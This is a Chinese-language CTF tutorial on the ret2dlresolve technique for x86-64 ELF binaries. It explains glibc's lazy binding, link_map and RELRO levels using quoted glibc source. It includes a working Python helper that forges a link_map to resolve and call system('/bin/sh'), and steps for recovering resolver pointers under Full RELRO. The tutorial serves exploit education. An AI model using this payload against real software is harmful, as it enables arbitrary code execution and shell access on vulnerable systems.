本文环境为 x86-64，32 位太老了就不学了。

## 前置知识

简单回顾一下 ELF 文件格式，具体的看 [[ELF 文件结构详解]]

参考文章：

1. [Ret2dlresolve攻击——从No RELRO到FULL RELRO](https://www.testzero-wz.com/2022/03/05/Ret2dlresolve%E2%80%94%E2%80%94%E4%BB%8ENo-RELRO%E5%88%B0FULL-RELRO)
2. [ret2dlresolve](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve)

### Lazy Binding

延迟绑定技术，属于是 pwn 非常基础的知识了，这里不多赘述，需要了解的是执行这一步的函数名是 `_dl_runtime_resolve_xsavec`，后面会仔细分析。

### .DYNAMIC 节

.dynamic节则是存放了一些 `Elf64_Dyn` 结构体，说具体些就是键值对，关键字是各个动态段的标识，值则是各个动态段的对应的基址，即包括上图中的 .ret.plt、.dynsym、dynstr 节等。其主要作用就是在解析函数地址时使用这些键值对来找到各个动态段的基址，以确定数据条目的位置。

在 IDA 里看到的效果一般是下面这样：

![DYNAMIC段](https://pic1.imgdb.cn/item/68f77f883203f7be00890c24.png)

```c
typedef struct
{
  Elf64_Sxword        d_tag;           /* Dynamic entry type */
  union
    {
      Elf64_Xword d_val;               /* Integer value */
      Elf64_Addr d_ptr;                /* Address value */
    } d_un;
} Elf64_Dyn;
```

这里键值对的键是 `d_tag`，可取值如下：

```c
/* Legal values for d_tag (dynamic entry type).  */
#define DT_NULL                0                /* Marks end of dynamic section */
#define DT_NEEDED              1                /* Name of needed library */
#define DT_PLTRELSZ            2                /* Size in bytes of PLT relocs */
#define DT_PLTGOT              3                /* Processor defined value */
#define DT_HASH                4                /* Address of symbol hash table */
#define DT_STRTAB              5                /* Address of string table */
#define DT_SYMTAB              6                /* Address of symbol table */
#define DT_RELA                7                /* Address of Rela relocs */
#define DT_RELASZ              8                /* Total size of Rela relocs */
#define DT_RELAENT             9                /* Size of one Rela reloc */
#define DT_STRSZ              10                /* Size of string table */
#define DT_SYMENT             11                /* Size of one symbol table entry */
#define DT_INIT               12                /* Address of init function */
#define DT_FINI               13                /* Address of termination function */
#define DT_SONAME             14                /* Name of shared object */
#define DT_RPATH              15                /* Library search path (deprecated) */
#define DT_SYMBOLIC           16                /* Start symbol search here */
#define DT_REL                17                /* Address of Rel relocs */
#define DT_RELSZ              18                /* Total size of Rel relocs */
#define DT_RELENT             19                /* Size of one Rel reloc */
#define DT_PLTREL             20                /* Type of reloc in PLT */
#define DT_DEBUG              21                /* For debugging; unspecified */
#define DT_TEXTREL            22                /* Reloc might modify .text */
#define DT_JMPREL             23                /* Address of PLT relocs */
#define DT_BIND_NOW           24                /* Process relocations of object */
#define DT_INIT_ARRAY         25                /* Array with addresses of init fct */
#define DT_FINI_ARRAY         26                /* Array with addresses of fini fct */
#define DT_INIT_ARRAYSZ       27                /* Size in bytes of DT_INIT_ARRAY */
#define DT_FINI_ARRAYSZ       28                /* Size in bytes of DT_FINI_ARRAY */
#define DT_RUNPATH            29                /* Library search path */
#define DT_FLAGS              30                /* Flags for the object being loaded */
#define DT_ENCODING           32                /* Start of encoded range */
#define DT_PREINIT_ARRAY      32                /* Array with addresses of preinit fct*/
#define DT_PREINIT_ARRAYSZ    33                /* size in bytes of DT_PREINIT_ARRAY */
#define DT_SYMTAB_SHNDX       34                /* Address of SYMTAB_SHNDX section */
#define DT_NUM                35                /* Number used */
```

### link_map

`link_map` 是描述已加载的共享对象的结构体，采用双链表管理，该数据结构保存在 ld.so 的 .bss 段中。我们主要关注其中几个有意思的字段：

1. `l_addr`：共享对象的加载基址；
2. `l_next`，`l_prev`：管理 `link_map` 的双链表指针；
3. `l_info`：保存 `Elfxx_Dyn` 结构体指针的列表，用来寻找各节基址；如 `l_info[DT_STRTAB]` 指向保存着函数解析字符串表基址的 `Elfxx_Dyn` 结构体。


```c
/* Structure describing a loaded shared object.  The `l_next' and `l_prev'
   members form a chain of all the shared objects loaded at startup.
   These data structures exist in space used by the run-time dynamic linker;
   modifying them may have disastrous results.
   This data structure might change in future, if necessary.  User-level
   programs must avoid defining objects of this type.  */
struct link_map
  {
    /* These first few members are part of the protocol with the debugger.
       This is the same format used in SVR4.  */
    ElfW(Addr) l_addr;             /* Difference between the address in the ELF
                                   file and the addresses in memory.  */
    char *l_name;                /* Absolute file name object was found in.  */
    ElfW(Dyn) *l_ld;                /* Dynamic section of the shared object.  */
    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */
    /* All following members are internal to the dynamic linker.
       They may change without notice.  */
    /* This is an element which is only ever different from a pointer to
       the very same copy of this type for ld.so when it is used in more
       than one namespace.  */
    struct link_map *l_real;
    /* Number of the namespace this link map belongs to.  */
    Lmid_t l_ns;
    struct libname_list *l_libname;

    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];
    const ElfW(Phdr) *l_phdr;        /* Pointer to program header table in core.  */
    ElfW(Addr) l_entry;                /* Entry point location.  */
    ElfW(Half) l_phnum;                /* Number of program header entries.  */
    ElfW(Half) l_ldnum;                /* Number of dynamic segment entries.  */
```


### RELRO(Relocation Read-Only)

重定位段只读保护分为以下三个等级：

1. NO RELRO：保护未开的情况，所有重定位段均可写，包括 .dynamic、.got、.got.plt；
2. Partial RELRO：部分开启保护，其为 GCC 编译的默认配置。.dynamic、.got 被标记为只读，并且会强制地将 ELF 的内部数据段 .got，.got.plt 等放到外部数据段 .data、.bss之前，即防止程序数据段溢出改变内部数据段的值，从而劫持程序控制流。虽然 .got 标记为只读，但是 .got.plt 仍然可写，即仍然可以改写 GOT 表劫持程序控制流；
3. Full RELRO：继承 Partial RELRO 的所有保护，并且 .got.plt 也被标为只读。此时延迟绑定技术被禁止，所有的外部函数地址将在程序装载时解析、装入，并标记为只读，不可更改。此时不需要 `link_map` 以及 `dl_runtime_resolve` 函数，则GOT表中这两项数据均置为 0，此时 `ret2dlresolve` 技术最关键的两项数据丢失，并且GOT表不可写。

## 攻击链分析

### 源码

```c
/* Set up the loaded object described by L so its unrelocated PLT
   entries will jump to the on-demand fixup code in dl-runtime.c.  */

static inline int __attribute__ ((unused))
elf_machine_runtime_setup (struct link_map *l, struct r_scope_elem *scope[],
			   int lazy, int profile)
{
  if (l->l_info[DT_JMPREL] && lazy)
    {
      ElfW(Addr) *got;
      extern void _dl_runtime_resolve (ElfW(Word));

      got = (ElfW(Addr) *) D_PTR (l, l_info[DT_PLTGOT]);
      if (got[1])
	{
	  l->l_mach.plt = got[1] + l->l_addr;
	}
      got[1] = (ElfW(Addr)) l;

      /* The got[2] entry contains the address of a function which gets
	 called to get the address of a so far unresolved function and
	 jump to it.  The profiling extension of the dynamic linker allows
	 to intercept the calls to collect information.  In this case we
	 don't store the address in the GOT so that all future calls also
	 end in this function.  */
#ifdef SHARED
      extern void _dl_runtime_profile (ElfW(Word));
      if ( profile)
	{
	   got[2] = (ElfW(Addr)) &_dl_runtime_profile;

	  if (GLRO(dl_profile) != NULL
	      && _dl_name_match_p (GLRO(dl_profile), l))
	    /* Say that we really want profiling and the timers are
	       started.  */
	    GL(dl_profile_map) = l;
	}
      else
#endif
	{
	  /* This function will get called to fix up the GOT entry
	     indicated by the offset on the stack, and then jump to
	     the resolved address.  */
	  got[2] = (ElfW(Addr)) &_dl_runtime_resolve;
	}
    }

  return lazy;
}
```

这段源码解释了 GOT 表的前三项为什么是：DYNAMIC 节地址、linkmap 地址、`_dl_runtime_resolve_xsavec` 地址

```c
#define _dl_runtime_resolve	_dl_runtime_resolve_xsavec
```

`_dl_runtime_resolve` 这个函数是用汇编写的，继续看

```asm
...
	.globl _dl_runtime_resolve
	.hidden _dl_runtime_resolve
	.type _dl_runtime_resolve, @function
	# ...
	# Copy args pushed by PLT in register.
	# %rdi: link_map, %rsi: reloc_index
	mov (LOCAL_STORAGE_AREA + 8)(%BASE), %RSI_LP
	mov LOCAL_STORAGE_AREA(%BASE), %RDI_LP
	call _dl_fixup		# Call resolver.
	mov %RAX_LP, %R11_LP	# Save return value
	# Get register content back.
	# ...
```

可以得知这个函数的原型是 `_dl_runtime_resolve(link_map, reloc_index)`，继续看：

```c
/* All references to the value of l_info[DT_PLTGOT],
  l_info[DT_STRTAB], l_info[DT_SYMTAB], l_info[DT_RELA],
  l_info[DT_REL], l_info[DT_JMPREL], and l_info[VERSYMIDX (DT_VERSYM)]
  have to be accessed via the D_PTR macro.  The macro is needed since for
  most architectures the entry is already relocated - but for some not
  and we need to relocate at access time.  */
#define D_PTR(map, i) \
  ((map)->i->d_un.d_ptr + (dl_relocate_ld (map) ? 0 : (map)->l_addr))

#define LOOKUP_VALUE_ADDRESS(map, set) ((set) || (map) ? (map)->l_addr : 0)

/* Calculate the address of symbol REF using the base address from map MAP,
   if non-NULL.  Don't check for NULL map if MAP_SET is TRUE.  */
#define SYMBOL_ADDRESS(map, ref, map_set)				\
  ((ref) == NULL ? 0							\
   : (__glibc_unlikely ((ref)->st_shndx == SHN_ABS) ? 0			\
      : LOOKUP_VALUE_ADDRESS (map, map_set)) + (ref)->st_value)


DL_FIXUP_VALUE_TYPE
attribute_hidden __attribute ((noinline)) DL_ARCH_FIXUP_ATTRIBUTE
_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)
{
  const ElfW(Sym) *const symtab
    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);

  const uintptr_t pltgot = (uintptr_t) D_PTR (l, l_info[DT_PLTGOT]);

  const PLTREL *const reloc
    = (const void *) (D_PTR (l, l_info[DT_JMPREL])
		      + reloc_offset (pltgot, reloc_arg));
  const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
  const ElfW(Sym) *refsym = sym;
  void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);  // [1]
  lookup_t result;
  DL_FIXUP_VALUE_TYPE value;

  /* Sanity check that we're really looking at a PLT relocation.  */
  assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);

   /* Look up the target symbol.  If the normal lookup rules are not
      used don't look in the global scope.  */
  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)  // [2]
    {
      const struct r_found_version *version = NULL;

      if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)  // [7]
	{
	  const ElfW(Half) *vernum =
	    (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
	  version = &l->l_versions[ndx];  // [6]
	  if (version->hash == 0)
	    version = NULL;
	}

		...

      result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
				    version, ELF_RTYPE_CLASS_PLT, flags, NULL);  // [5]

		...

      /* Currently result contains the base load address (or link map)
	 of the object that defines sym.  Now add in the symbol
	 offset.  */
      value = DL_FIXUP_MAKE_VALUE (result,
				   SYMBOL_ADDRESS (result, sym, false));  // [3]
    }
  else
    {
      /* We already found the symbol.  The module (and therefore its load
	 address) is also known.  */
      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true));  // [4]
      result = l;
    }

  /* And now perhaps the relocation addend.  */
  value = elf_machine_plt_value (l, reloc, value);

	...

  /* Finally, fix up the plt itself.  */
  if (__glibc_unlikely (GLRO(dl_bind_not)))
    return value;

  return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);
}
```


函数源码我精简过了，流程非常清楚。

先来看 [1] 以及之前的局部变量定义部分，可以看到：
1. `symtab`、`strtab`、`pltgot` 都是直接通过 `l->l_info` 获取的，如 `pltgot` 的值就是 `.plt.got` 段的起始地址
2. `reloc` 的值是 `JMPREL` 段中对应 `reloc_index` 的元素地址，这个段中元素的定义如下，其中 `r_offset` 是正在解析的函数的 got 表项（如果没开 pie 是真实地址，开了就是偏移），`r_info` 是复合字节，一般用的是高 4 字节 

```c
typedef struct elf64_rela {
  Elf64_Addr r_offset;	/* Location at which to apply the action */
  Elf64_Xword r_info;	/* index and type of relocation */
  Elf64_Sxword r_addend;	/* Constant addend used to compute value */
} Elf64_Rela;
```

3. `sym` 是 `symtab` 里对应的项，元素定义如下：

```c
typedef struct elf64_sym {
  Elf64_Word st_name;		/* 一个字符串表的索引值，如果为 0 说明符号没有名称 */
  unsigned char	st_info;	/* 指定符号的类型和绑定的属性 */
  unsigned char	st_other;	/* 定义了符号的可见性 */
  Elf64_Half st_shndx;		/* 每个符号表条目都与某个部分相关。该成员保存相关的段头表索引。 */
  Elf64_Addr st_value;		/* 相关符号的地址 */
  Elf64_Xword st_size;		/* 符号的大小 */
} Elf64_Sym;
```


然后接下来来看 [3] 和 [4] 也就是程序最终的返回结果，可以得知最终的结果是通过 `l->l_addr + sym->st_value` 计算得到的。


### NO RELRO

在 NO RELRO 的情况下，.dynamic 节是可以被修改的，即重定位相关的各表项的基址我们可以修改到可控区域，准确地说是借用正常函数解析的各项表项，仅修改 STRTAB 表的基址，使得最后找到的函数字符串是我们可控的，然后达成任意函数执行的目的。

这个打法主要就是劫持 [5] 处 `strtab + sym->st_name` 的值，具体来说只需要用任意写原语修改 `strtab` 就行了。


### Partial RELRO

通过阅读源码我们知道，保存在 ld.so 数据段内存中的 `linkmap->l_info` 是寻找函数的关键，它是一个存储动态指针的链表，如 `l_info[DT_STRTAB]`、`l_info[DT_JMPREL]`、`l_info[DT_SYMTAB]` 等每个元素都是指向 `Elfxx_Dyn` 结构体的指针，它们一般情况下指向 elf 中 dynamic 段中的各项 Elfxx_Dyn 条目。

于是我们可以修改 `linkmap->l_info[DT_STRTAB]` 到我们的可控区域，然后伪造 `Elf_Dyn` 条目和函数字符串即可，即我们回到了第 1 节所述情况，而不需要伪造多个条目，计算多个偏移了。

值得注意的是，在 x64 的情况下，该方法需要任意读写才能完成，因为我们需要控制 `&link_map+0x1c8` 为 NULL，否则我们绕不开 [7] 的判断，程序仍然会在 [6] 崩溃。



因此接下来主要介绍只有任意写原语，没有任何 leak 的极端情况（如果能泄漏 linkmap 地址为什么还要打 re2dl？？？）


既然绕不开 [7] 的判断（没有泄漏 linkmap 地址），那就绕过 [2] 的判断，也就是仅需要在构造 `Elf_Sym` 结构体时将 `Elf_Sym->st_other` 设置为非 0 即可绕开，进入 else 分支。

这两个分支的区别无非在于当前查询的符号知否是已知的：

1. 若不是已知的则找到待解析函数所在文件的 `link_map`，然后取出 `l_addr` 再计算
2. 若是已知的则直接拿 `l->l_addr` 进行计算。

ok 接下来只需要伪造一个 `linkmap` 就可以了，为了压缩 payload，我们尽可能的复用结构体。

```python
# payload 参考 ctfwiki 的，0x100 bytes
def construct_linkmap(fake_linkmap_addr, known_func_ptr, offset):
    '''
    elf: is the ELF object
    fake_linkmap_addr: the address of the fake linkmap
    known_func_ptr: a already known pointer of the function, e.g., elf.got['__libc_start_main']
    offset_of_two_addr: target_function_addr - *(known_function_ptr), where
                        target_function_addr is the function you want to execute
    WARNING: assert *(known_function_ptr-8) & 0x0000030000000000 != 0 as ELF64_ST_VISIBILITY(o) = o & 0x3
    WARNING: be careful that fake_linkmap is 0x100 bytes length
    we will do _dl_runtime_resolve(linkmap,reloc_arg) where reloc_arg=0

    linkmap:
        0x00: l_addr = offset_of_two_addr
      fake_DT_JMPREL entry, addr = fake_linkmap_addr + 0x8
        0x08: 17, tag of the JMPREL
        0x10: fake_linkmap_addr + 0x18, pointer of the fake JMPREL
      fake_JMPREL, addr = fake_linkmap_addr + 0x18
        0x18: p_r_offset, offset pointer to the resloved addr
        0x20: r_info
        0x28: append
      resolved addr
        0x30: r_offset
      fake_DT_SYMTAB, addr = fake_linkmap_addr + 0x38
        0x38: 6, tag of the DT_SYMTAB
        0x40: known_function_ptr-8, p_fake_symbol_table
      command that you want to execute for system
        0x48: /bin/sh
      P_DT_STRTAB, pointer for DT_STRTAB
        0x68: fake a pointer, e.g., fake_linkmap_addr
      p_DT_SYMTAB, pointer for fake_DT_SYMTAB
        0x70: fake_linkmap_addr + 0x38
      p_DT_JMPREL, pointer for fake_DT_JMPREL
        0xf8: fake_linkmap_addr + 0x8
    '''

    plt0 = elf.get_section_by_name('.plt').header.sh_addr
    jmprel_addr = fake_linkmap_addr + 0x8
    jmprel = fake_linkmap_addr + 0x18
    rela_addr = fake_linkmap_addr + 0x30

    linkmap = flat({
        0x00: offset & (2 ** 64 - 1),
        0x08: 0x17,
        0x10: jmprel,
        0x18: (rela_addr - offset) & (2**64 - 1),  # r_offset
        0x20: 0x7,
        0x28: 0,
        0x30: 0,
        0x38: 6,
        0x40: known_func_ptr - 8,
        0x48: b"/bin/sh\x00",
        0x68: fake_linkmap_addr,
        0x70: rela_addr + 8,  # r_info
        0xf8: fake_linkmap_addr + 8
    })

    resolve_call = p64(plt0+6) + p64(fake_linkmap_addr) + p64(0)
    return (linkmap, resolve_call)


fake_linkmap, resolve_call = construct_linkmap(bss, elf.got['read'], libc.sym['system'] - libc.sym['read'])
```


然后控制程序执行流去调用 `_dl_resolve(fake_linkmap, 0)` 即可。

另外也可以构造下图的这种：

![复用 got 表](https://pic1.imgdb.cn/item/68f7bf0f3203f7be0089b85a.png)

此时(假设为64位)的 `Elf_Sym` 中的 `st_name` 和 `st_other` 字段将与 func B` 的上一个 GOT 表项重合， 可能更省字节一点 ~~但是感觉没什么必要~~

### FULL RELRO

此时 `.got.plt` 表中的第二项表项 `GOT[1]` 装载的 `link_map` 地址以及第三项表项 `GOT[2]` 装载的`dl_runtime_resolve` 函数地址将是 0。


读取各类数据结构寻回 `_dl_runtime_resolve` 的值以及 `link_map` 的值即可。

```c
/* offset    |  size */  type = struct r_debug {
/*    0      |     4 */    int r_version;
/* XXX  4-byte hole  */
/*    8      |     8 */    struct link_map_public *r_map;
/*   16      |     8 */    Elf64_Addr r_brk;
/*   24      |     4 */    enum {RT_CONSISTENT, RT_ADD, RT_DELETE} r_state;
/* XXX  4-byte hole  */
/*   32      |     8 */    Elf64_Addr r_ldbase
```

这个 `r_map` 就是 `linkmap` 的地址，而 `dl_runtime_resolve` 地址可以通过其他 `linkmap` 的 got 表找。

寻找的逻辑链如下：

1. 读取 `.dynamic` 段中以 `DT_DEBUG` 符号为关键字的值，即得到 `r_debug` 的地址；
2. 从 `r_debug` 结构体中读出 `r_map` 的值，即 `link_map` 地址；
3. 从 `link_map` 结构体中读出的 `l_next` 的值，遍历 `link_map` 链表；
4. 读取每个 `link_map` 中的`l_info[DT_PLTGOT]`的值，判断该值是否为 0，若不为 0 则认为是未开启 FULL RELRO 的 so 文件，即存在 .got.plt 表，此时应读出该 `l_info[DT_PLTGOT]` 的值，得到该 `so` 文件的 `Elf_Dyn(DT_PLTGOT)` 结构体的地址；
5. 从 `Elf_Dyn(DT_PLTGOT)` 结构体中读出 `.got.plt` 节的基址；
6. 然后读出第三个表项即 `.got.plt[2]` 的值，该值即为 `_dl_runtime_resolve` 的地址。


然后当 Partial RELRO 打就可以了。